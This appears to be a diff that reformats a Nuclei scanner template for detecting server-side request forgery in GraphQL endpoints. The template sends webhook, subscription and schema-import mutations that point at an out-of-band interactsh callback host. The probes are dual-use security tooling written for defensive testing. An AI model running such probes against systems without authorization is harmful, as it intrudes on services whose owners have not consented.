@@ -1,122 +1,93 @@
+http:
+- body: "{\n  \"query\": \"subscription { __schema { subscriptionType { fields { name\
+    \ description args { name type { name } } } } } }\",\n  \"variables\": {}\n}\n"
+  headers:
+    Accept: application/json
+    Content-Type: application/json
+  matchers:
+  - condition: and
+    part: body
+    type: word
+    words:
+    - '"subscriptionType"'
+    - '"fields"'
+  - status:
+    - 200
+    type: status
+  matchers-condition: and
+  method: POST
+  path:
+  - '{{BaseURL}}/graphql'
+  - '{{BaseURL}}/api/graphql'
+  - '{{BaseURL}}/v1/graphql'
+  - '{{BaseURL}}/query'
+- body: "{\n  \"query\": \"mutation RegisterWebhook($url: String!) { registerWebhook(callbackUrl:\
+    \ $url) { id status } }\",\n  \"variables\": {\n    \"url\": \"{{callback_url}}/register-{{subscription_id}}\"\
+    \n  }\n}\n"
+  headers:
+    Accept: application/json
+    Content-Type: application/json
+  method: POST
+  path:
+  - '{{BaseURL}}/graphql'
+  - '{{BaseURL}}/api/graphql'
+  - '{{BaseURL}}/v1/graphql'
+  - '{{BaseURL}}/query'
+- body: "{\n  \"query\": \"mutation CreateSubscription($callback: String!) { createSubscription(webhookUrl:\
+    \ $callback) { subscriptionId } }\",\n  \"variables\": {\n    \"callback\": \"\
+    {{callback_url}}/subscription-{{subscription_id}}\"\n  }\n}\n"
+  headers:
+    Accept: application/json
+    Content-Type: application/json
+  method: POST
+  path:
+  - '{{BaseURL}}/graphql'
+  - '{{BaseURL}}/api/graphql'
+  - '{{BaseURL}}/v1/graphql'
+  - '{{BaseURL}}/query'
+- body: "{\n  \"query\": \"mutation ImportSchema($url: String!) { importSchema(schemaUrl:\
+    \ $url) { success errors } }\",\n  \"variables\": {\n    \"url\": \"{{callback_url}}/schema-{{subscription_id}}.graphql\"\
+    \n  }\n}\n"
+  headers:
+    Accept: application/json
+    Content-Type: application/json
+  matchers:
+  - condition: or
+    part: interactsh_protocol
+    type: word
+    words:
+    - http
+    - dns
+  - part: interactsh_request
+    type: word
+    words:
+    - '{{subscription_id}}'
+  matchers-condition: and
+  method: POST
+  path:
+  - '{{BaseURL}}/graphql'
+  - '{{BaseURL}}/api/graphql'
+  - '{{BaseURL}}/v1/graphql'
+  - '{{BaseURL}}/query'
 id: graphql-subscription-oob
-
 info:
-  name: GraphQL Subscription OOB Callback Detection
   author: geeknik
-  severity: medium
-  description: |
-    Detects GraphQL endpoints that support subscriptions with external callback URLs,
-    potentially leading to SSRF via subscription webhook notifications or schema fetching.
-  reference:
-    - https://graphql.org/blog/subscriptions-in-graphql-and-relay/
-    - https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/19-Testing_for_Server-Side_Request_Forgery
   classification:
     cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:N/A:N
     cvss-score: 5.8
     cwe-id: CWE-918
+  description: 'Detects GraphQL endpoints that support subscriptions with external
+    callback URLs,
+
+    potentially leading to SSRF via subscription webhook notifications or schema fetching.
+
+    '
+  name: GraphQL Subscription OOB Callback Detection
+  reference:
+  - https://graphql.org/blog/subscriptions-in-graphql-and-relay/
+  - https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/19-Testing_for_Server-Side_Request_Forgery
+  severity: medium
   tags: graphql,oob,ssrf,subscription,callback
-
 variables:
-  callback_url: "{{interactsh-url}}"
-  subscription_id: "{{randstr}}"
-
-http:
-  - method: POST
-    path:
-      - "{{BaseURL}}/graphql"
-      - "{{BaseURL}}/api/graphql"
-      - "{{BaseURL}}/v1/graphql"
-      - "{{BaseURL}}/query"
-
-    headers:
-      Content-Type: application/json
-      Accept: application/json
-
-    body: |
-      {
-        "query": "subscription { __schema { subscriptionType { fields { name description args { name type { name } } } } } }",
-        "variables": {}
-      }
-
-    matchers-condition: and
-    matchers:
-      - type: word
-        part: body
-        words:
-          - '"subscriptionType"'
-          - '"fields"'
-        condition: and
-
-      - type: status
-        status:
-          - 200
-
-  - method: POST
-    path:
-      - "{{BaseURL}}/graphql"
-      - "{{BaseURL}}/api/graphql"
-      - "{{BaseURL}}/v1/graphql"
-      - "{{BaseURL}}/query"
-
-    headers:
-      Content-Type: application/json
-      Accept: application/json
-
-    body: |
-      {
-        "query": "mutation RegisterWebhook($url: String!) { registerWebhook(callbackUrl: $url) { id status } }",
-        "variables": {
-          "url": "{{callback_url}}/register-{{subscription_id}}"
-        }
-      }
-
-  - method: POST
-    path:
-      - "{{BaseURL}}/graphql"
-      - "{{BaseURL}}/api/graphql"
-      - "{{BaseURL}}/v1/graphql"
-      - "{{BaseURL}}/query"
-
-    headers:
-      Content-Type: application/json
-      Accept: application/json
-
-    body: |
-      {
-        "query": "mutation CreateSubscription($callback: String!) { createSubscription(webhookUrl: $callback) { subscriptionId } }",
-        "variables": {
-          "callback": "{{callback_url}}/subscription-{{subscription_id}}"
-        }
-      }
-
-  - method: POST
-    path:
-      - "{{BaseURL}}/graphql"
-      - "{{BaseURL}}/api/graphql"
-      - "{{BaseURL}}/v1/graphql"
-      - "{{BaseURL}}/query"
-
-    headers:
-      Content-Type: application/json
-      Accept: application/json
-
-    body: |
-      {
-        "query": "mutation ImportSchema($url: String!) { importSchema(schemaUrl: $url) { success errors } }",
-        "variables": {
-          "url": "{{callback_url}}/schema-{{subscription_id}}.graphql"
-        }
-      }
-
-    matchers-condition: and
-    matchers:
-      - type: word
-        part: interactsh_protocol
-        words:
-          - "http"
-          - "dns"
-        condition: or
-      - type: word
-        part: interactsh_request
-        words:
-          - "{{subscription_id}}"
+  callback_url: '{{interactsh-url}}'
+  subscription_id: '{{randstr}}'
